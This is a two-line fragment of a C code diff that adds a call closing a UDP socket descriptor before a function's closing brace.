+    close(fd_udp);
 }
